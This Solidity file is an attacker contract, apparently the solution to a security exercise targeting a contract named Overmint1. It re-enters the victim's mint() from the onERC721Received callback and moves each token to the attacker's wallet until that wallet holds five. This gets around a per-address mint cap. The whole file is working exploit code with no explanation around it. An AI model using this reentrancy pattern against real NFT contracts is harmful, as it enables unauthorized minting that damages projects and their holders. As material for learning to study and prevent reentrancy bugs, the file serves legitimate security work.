// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {Overmint1} from "./Overmint1.sol";

contract Overmint1Attacker is IERC721Receiver {
    Overmint1 immutable i_victim;
    address immutable i_attackerWallet;

    constructor(address victim) {
        i_victim = Overmint1(victim);
        i_attackerWallet = msg.sender;
    }

    function attack() external {
        i_victim.mint();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        // require(operator == address(i_victim));

        i_victim.transferFrom(address(this), i_attackerWallet, tokenId);

        if (i_victim.balanceOf(i_attackerWallet) < 5) {
            i_victim.mint();
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}
